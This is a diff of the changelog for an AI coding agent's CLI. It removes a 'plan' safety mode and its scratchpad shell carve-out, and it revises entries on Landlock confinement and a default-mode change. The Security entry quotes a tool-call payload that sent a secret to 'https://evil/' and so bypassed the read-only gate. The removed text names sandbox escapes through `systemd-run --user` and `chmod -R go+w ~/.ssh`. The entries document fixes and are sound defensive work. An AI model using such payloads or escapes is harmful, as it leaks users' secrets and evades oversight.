@@ -7,37 +7,6 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
-### Added
-
-- **Plan mode can work in the scratchpad.** A shell command that provably
-  writes nothing outside the session scratchpad now runs while a plan is being
-  drafted, so unpacking an archive to read it — `ar x $MERMAID_SCRATCHPAD/pkg.deb
-  && tar -tJf control.tar.xz` — is research a plan can actually do. Before, the
-  prompt told the model to use the scratchpad for all temporary files and the
-  gate then denied every spelling of it, including `$MERMAID_SCRATCHPAD`
-  itself: the containment prover rejected `$` outright, so the only handle the
-  shell is given could never satisfy it.
-
-  Authorization is a lexical proof (`is_scratch_only_command`), not the
-  sandbox. Every segment of the command is proven independently, so `|`, `&&`,
-  `||` and `;` are fine; each segment's head must be a known reader or one of
-  the archive/inspection tools in `SCRATCH_TOOLS`; every path-shaped argument
-  must stay inside the scratchpad; and command substitution, backticks, globs,
-  `~`, heredocs, `tee`/`dd` and cwd-changing builtins all refuse.
-
-  The OS write-confinement runs beneath that as defense-in-depth, never in
-  place of it — the network kill-switch spares `AF_UNIX` by design (so
-  `systemd-run --user` would otherwise escape into an unconfined child) and
-  Landlock carries no mode/owner/xattr right (so `chmod -R go+w ~/.ssh` would
-  not be confined). The head allowlist is what puts both out of reach. The
-  confinement is also tighter than the existing one: the scratchpad plus the
-  discard devices, and specifically not the project root or the system temp
-  directory that contains the scratchpad.
-
-  Tunable as `[plan] scratchpad` (`allow` by default, `deny` under the strict
-  preset) and cyclable in `/plan config`. The working tree stays read-only
-  regardless.
-
 ### Fixed
 
 - **The pedantic lint debt is back under its baseline.** Eleven lints had drifted
@@ -113,10 +82,9 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 - **Landlock rules no longer fail on device files.** Granting a write root
   that is a file rather than a directory asked the kernel for directory-only
   rights (`MakeReg`, `RemoveFile`, …) on a non-directory and failed the whole
-  ruleset with `EBADFD`. Files now get the file-applicable subset, which is
-  what lets the scratch confinement name `/dev/null` individually instead of
-  granting `/dev` as a hierarchy — the latter also hands out `/dev/sda` and
-  `/dev/mem`.
+  ruleset with `EBADFD`. Files now get the file-applicable subset, so a
+  confinement can name `/dev/null` individually instead of granting `/dev` as
+  a hierarchy — the latter also hands out `/dev/sda` and `/dev/mem`.
 
 
 ### Security
@@ -142,10 +110,9 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   to the safety gate: `execute()` built its request from `command` alone, then
   handed the URL to the OS browser launcher from the *unsandboxed* parent
   process. So a command that classifies read-only carried an arbitrary URL out
-  of the two modes that exist to prevent that —
+  of the mode that exists to prevent that —
   `{"command": "cat README.md", "mode": "background", "open_url":
-  "https://evil/?d=<secret>"}` opened the attacker's URL in `read_only` and
-  `plan` mode, bypassing `[plan] web = ask` entirely. The URL is now gated as
+  "https://evil/?d=<secret>"}` opened the attacker's URL in `read_only`. The URL is now gated as
   Web egress *before* the process spawns, so a refusal also leaves no detached
   child behind, and the URL itself reaches the classifier and the approval
   modal (a dev-server URL and an exfiltrating one are otherwise
@@ -182,6 +149,27 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ### Changed
 
+- **BREAKING: plan mode is gone; `read_only` stays.** The `plan` safety mode,
+  the `enter_plan_mode` / `exit_plan_mode` tools, `/plan`, `/config` (whose
+  only section was plan settings), the `[plan]` config table, and
+  `mermaid run --plan` / `--plan-autoaccept` are removed, along with the
+  machinery that existed only for them: the plan-mode system prompt and the
+  surgery it did on the base prompt, the plan-file and safe-build carve-outs,
+  the scratchpad-only shell carve-out and its dedicated confinement, the
+  per-dispatch plan reminder and its stall breaker, checklist seeding from an
+  approved plan, and the `plan` payload on `tool_finished` events. Shift+Tab
+  now cycles `read_only → ask → auto → full_access`. For "look but don't
+  touch", use `read_only` (Shift+Tab, `/safety read_only`, or
+  `[safety] mode = "read_only"`); the model plans in the conversation like it
+  does in any other mode.
+
+  Old state still loads: a conversation saved while planning resumes in the
+  configured safety mode, and an approved plan in an old transcript renders as
+  an ordinary tool row. A leftover `[plan]` table is reported as an unknown
+  key and ignored. `[safety] mode = "plan"` is now an invalid value (it was
+  already reset to the default at load), and a `--replay` log that contains
+  `/plan` no longer parses.
+
 - **Dependency and action roll-up.** `base64` 0.22 -> 0.23 (a major bump, but the
   API this codebase uses is unchanged), `reqwest` 0.13.4 -> 0.13.5, `rusqlite`
   0.40.1 -> 0.40.2, `which` 8.0.4 -> 8.0.6, `async-trait` 0.1.89 -> 0.1.92, and
@@ -203,10 +191,7 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 - **BREAKING: default safety mode is now `Auto` (was `Ask`).** A fresh
   session — with no `mode` in any config file — starts classifier-vetted:
   aligned actions run without prompting, risky or off-task ones still
-  escalate to an approval prompt. Leaving plan mode (`/plan off`, plan
-  approval, handoffs) lands on the configured `[safety] mode`, which is
-  `auto` unless pinned — so accepting a plan no longer drops you into
-  `ask`. Set `[safety] mode = "ask"` in config to restore
+  escalate to an approval prompt. Set `[safety] mode = "ask"` in config to restore
   prompt-before-everything; existing configs that already pin a mode
   (including `mode = "ask"` frozen by an earlier `mermaid init`) keep
   their value.
